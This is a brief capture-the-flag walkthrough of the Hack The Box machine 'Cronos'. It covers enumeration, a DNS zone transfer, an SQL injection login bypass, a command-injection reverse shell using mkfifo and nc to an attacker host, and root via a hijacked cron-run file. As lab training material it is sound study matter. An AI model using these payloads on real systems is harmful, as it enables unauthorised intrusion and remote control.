## Cronos

Difficulty: Medium

### User Flag

```
rustscan -a cronos.htb --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/218790726-e3358d3f-b7cb-4a73-89ec-3d2c80a260bc.png)

<br>

In cronos.htb we don't find anything interesting, so we can enumerate subdomains.

```
dig axfr @10.10.10.13 cronos.htb
```

![subdomainAdmin](https://user-images.githubusercontent.com/58514930/218790868-fa247149-d64a-4420-9018-20a7caf553d7.png)

<br>

We can bypass the login with **admin ' or ''='** in the username input.

![loginBypass](https://user-images.githubusercontent.com/58514930/218791418-dfd2f086-24f4-479d-93ce-f826c3721b22.png)

<br>

Here we can execute other commands with & and get a user shell.

```
10.10.14.2 & rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f
```

![getUserShell](https://user-images.githubusercontent.com/58514930/218791763-21268cc9-381b-492c-918e-b31adc25baed.png)

### Root Flag

In /etc/crontab there is a task with user permissions.

![cronjob](https://user-images.githubusercontent.com/58514930/218792146-c26c3a47-1396-45df-b8fe-f62699111fec.png)

Change /var/www/laravel/artisan to php-reverse-shell.php and get a root shell.

![getRoot](https://user-images.githubusercontent.com/58514930/218792331-9a4b1753-b4a3-4c33-904e-2bde7f554f30.png)
